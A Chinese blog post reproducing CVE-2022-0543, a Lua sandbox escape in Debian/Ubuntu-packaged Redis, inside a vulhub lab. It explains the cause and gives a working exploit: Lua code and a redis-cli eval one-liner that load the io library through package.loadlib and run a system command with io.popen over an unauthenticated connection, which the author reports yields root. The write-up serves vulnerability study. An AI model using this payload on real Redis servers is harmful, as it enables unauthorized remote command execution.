
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/MrSoap/p/18738696" title="发布于 2025-02-26 15:58">
    <span role="heading" aria-level="2">【vulhub】redis CVE-2022-0543（redis沙盒逃逸）</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                    <div id="cnblogs_post_description" style="display: none">
        
        CVE-2022-0543
redis沙盒逃逸漏洞复现
    </div>
<div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="渗透环境">渗透环境</h1>
<p>攻击机：&nbsp;&nbsp;&nbsp;IP:&nbsp;192.168.66.130（Kali）</p>
<p>漏洞收录于：vulhub/redis/CVE-2022-0543</p>
<p>涉及知识点：redis沙盒逃逸</p>
<h1 id="漏洞详情">漏洞详情</h1>
<p><strong>受影响的系统</strong>：</p>
<ul>
<li><strong>仅限于 Debian 系 Linux 发行版</strong>（如 Debian、Ubuntu）及其衍生版本。</li>
<li><strong>不受影响的系统</strong>：CentOS、RHEL 等非 Debian 系发行版不受此漏洞影响（漏洞源于 Debian 维护者在打包 Redis 时的补丁问题，而非 Redis 自身代码问题）。</li>
</ul>
<p><strong>受影响的 Redis 版本范围</strong>：</p>
<ul>
<li>redis版本小于等于6.x的都可以尝试。</li>
</ul>
<p><strong>触发条件</strong>：</p>
<p>​	攻击者需具备 Redis 的未授权访问权限或合法凭证。</p>
<p><strong>漏洞原理</strong></p>
<ol>
<li>
<p><strong>背景</strong><br>
Redis 允许通过 <code>eval</code> 命令执行 Lua 脚本，但正常情况下这些脚本运行在沙箱中，无法执行系统命令或文件操作。</p>
</li>
<li>
<p><strong>补丁引入的漏洞</strong><br>
Debian/Ubuntu 在打包 Redis 时，通过补丁代码向 Lua 沙箱中注入了一个名为 <code>package</code> 的全局对象。该对象本应在源码中被注释（出于沙箱安全考虑），但补丁错误地重新启用了它。</p>
</li>
<li>
<p><strong>沙盒逃逸过程</strong></p>
<ul>
<li><strong>加载动态库</strong>：攻击者可通过 <code>package.loadlib</code> 加载 Lua 系统库（如 <code>liblua5.1.so.0</code>），调用其导出函数（如 <code>luaopen_io</code>）获取 <code>io</code> 库权限。</li>
<li><strong>执行命令</strong>：利用 <code>io.popen</code> 等函数执行任意系统命令。</li>
</ul>
<pre><code class="language-lua">local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io");
local io = io_l();
local f = io.popen("whoami", "r");  -- 执行系统命令
local res = f:read("*a");
f:close();
return res;
</code></pre>
</li>
</ol>
<p><strong>攻击思路</strong>：</p>
<p>单从攻击角度而言，可以使用redis未授权相同的打法，博客见：<a href="https://www.cnblogs.com/MrSoap/p/18737580" target="_blank">【vulhub】redis 4-unacc （redis未授权访问） - Mr_Soap - 博客园</a></p>
<p>从漏洞角度来看，使用<code>eval</code>函数执行上面的逃逸过程即可。</p>
<h1 id="复现漏洞">复现漏洞</h1>
<h2 id="一-启动漏洞容器">一、 启动漏洞容器</h2>
<pre><code class="language-shell">docker-compose up -d
</code></pre>
<p><img src="https://img2023.cnblogs.com/blog/3159215/202502/3159215-20250226150717320-1275936373.png" alt="img" loading="lazy"></p>
<p>可以看到redis运行在默认端口6379上</p>
<h2 id="二未授权连接">二、未授权连接</h2>
<pre><code class="language-shell">redis-cli -h 192.168.66.130
</code></pre>
<blockquote>
<p>redis-cli -h [IP] -p [port] -a [password]</p>
<p>当使用默认端口6379时可不使用参数-p</p>
</blockquote>
<p>测试连接，ping一下，成功连接</p>
<p><img src="https://img2023.cnblogs.com/blog/3159215/202502/3159215-20250225201911846-2084344108.png" alt="img" loading="lazy"></p>
<h2 id="三get-shell">三、get shell</h2>
<pre><code class="language-shell">eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io");local io = io_l();local f = io.popen("whoami", "r");local res = f:read("*a");f:close();return res;' 0
</code></pre>
<p><img src="https://img2023.cnblogs.com/blog/3159215/202502/3159215-20250226151430108-467796374.png" alt="img" loading="lazy"></p>
<p>可以看到命令都已经成功执行，我们已经拿到了root权限</p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0.01505729224537037" data-date-created="BlogServer.Application.Dto.BlogPost.BlogPostDto" data-date-updated="2025-02-26 15:59">2025-02-26 15:58</span>&nbsp;
<a href="https://www.cnblogs.com/MrSoap">Mr_Soap</a>&nbsp;
阅读(<span id="post_view_count">0</span>)&nbsp;
评论(<span id="post_comment_count">0</span>)&nbsp;
<a href="https://i.cnblogs.com/EditPosts.aspx?postid=18738696" rel="nofollow">编辑</a>&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(18738696);return false;">收藏</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '18738696', targetLink: 'https://www.cnblogs.com/MrSoap/p/18738696', title: '【vulhub】redis CVE-2022-0543（redis沙盒逃逸）' })">举报</a>
</div>
        